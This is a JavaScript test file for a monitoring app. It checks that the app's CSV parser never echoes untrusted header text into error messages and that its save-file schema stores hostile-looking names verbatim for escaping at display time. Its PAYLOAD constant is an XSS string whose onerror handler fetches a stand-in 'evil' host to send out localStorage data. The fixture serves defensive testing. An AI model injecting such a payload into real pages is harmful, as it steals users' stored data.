/**
 * Injection safety for every string that reaches the DOM.
 *
 * Names in this app (halls, sites, SLAs, sensors, scenarios) arrive from
 * colleagues' SAVE FILES and from BMS CSV exports — not only from the local
 * keyboard — so "the user would only be attacking themselves" was never the
 * threat model. These fixtures pin the two properties that keep a crafted
 * name inert: the parser never echoes untrusted file text back for HTML
 * rendering, and the schema preserves such names losslessly so the display
 * layer (not the store) is the single place escaping happens.
 */

import { describe, it, expect } from 'vitest';
import { parseTrendCsv } from '../src/lib/trendcsv.js';
import { normalizeHall, normalizeSla, validateSaveFile } from '../src/state/schema.js';

const PAYLOAD = '<img src=x onerror="fetch(\'//evil/?d=\'+localStorage.getItem(\'sdc_hep_v4\'))">';

describe('trend CSV parser', () => {
  it('never echoes the file\'s own header text into an error message', () => {
    // The failure path is rendered in the app; a BMS export is untrusted.
    const csv = `${PAYLOAD},b,c\n1,2,3\n4,5,6\n`;
    const r = parseTrendCsv(csv);
    expect(r.ok).toBe(false);
    expect(r.error).not.toContain('<img');
    expect(r.error).not.toContain('onerror');
    // It still has to be USEFUL: name what was missing and how many columns.
    expect(r.error).toContain('a time column');
    expect(r.error).toContain('3 columns');
  });

  it('carries no untrusted text in any other failure message', () => {
    for (const bad of ['', 'one line only', `${PAYLOAD}\n${PAYLOAD}\n${PAYLOAD}\n`]) {
      const r = parseTrendCsv(bad);
      expect(r.ok).toBe(false);
      expect(r.error).not.toContain('<img');
      expect(r.error).not.toContain('onerror');
    }
  });
});

describe('save-file schema', () => {
  it('preserves hostile-looking names verbatim — escaping belongs to display', () => {
    // Mangling stored data would corrupt legitimate names containing < or &
    // (e.g. "A&B Hall"); the store keeps truth, the renderer escapes.
    expect(normalizeHall({ name: PAYLOAD, siteName: PAYLOAD }).siteName).toBe(PAYLOAD);
    expect(normalizeSla({ name: PAYLOAD }).name).toBe(PAYLOAD);
    const v = validateSaveFile({
      hallProfiles: [{ name: 'H', siteName: PAYLOAD }],
      slaProfiles: [{ name: PAYLOAD, tMinF: 59, tMaxF: 89.6, rhMin: 8, rhMax: 80 }],
    });
    expect(v.ok).toBe(true);
    expect(v.halls[0].siteName).toBe(PAYLOAD);
    expect(v.slas[0].name).toBe(PAYLOAD);
  });

  it('refuses a save file from a newer app version instead of half-importing it', () => {
    const newer = validateSaveFile({
      version: 99,
      hallProfiles: [{ name: 'H' }],
      slaProfiles: [{ name: 'S' }],
    });
    expect(newer.ok).toBe(false);
    expect(newer.error).toContain('newer version');
    // Every array is still present and empty, so merge code can't trip on it.
    expect(newer.halls).toEqual([]);
    expect(newer.sensorLog).toEqual([]);
    expect(newer.sensorRegistry).toEqual([]);
    // Current and older/unstamped files still load.
    expect(validateSaveFile({ version: 1, hallProfiles: [{ name: 'H' }] }).ok).toBe(true);
    expect(validateSaveFile({ hallProfiles: [{ name: 'H' }] }).ok).toBe(true);
  });

  it('every rejection path returns the full empty shape', () => {
    for (const bad of [null, 42, 'x', [], {}, { foo: 1 }, { version: 99 }]) {
      const v = validateSaveFile(bad);
      expect(v.ok).toBe(false);
      for (const k of ['halls', 'slas', 'sites', 'scenarios', 'sensorLog', 'sensorRegistry']) {
        expect(Array.isArray(v[k]), `${k} on ${JSON.stringify(bad)}`).toBe(true);
      }
    }
  });
});
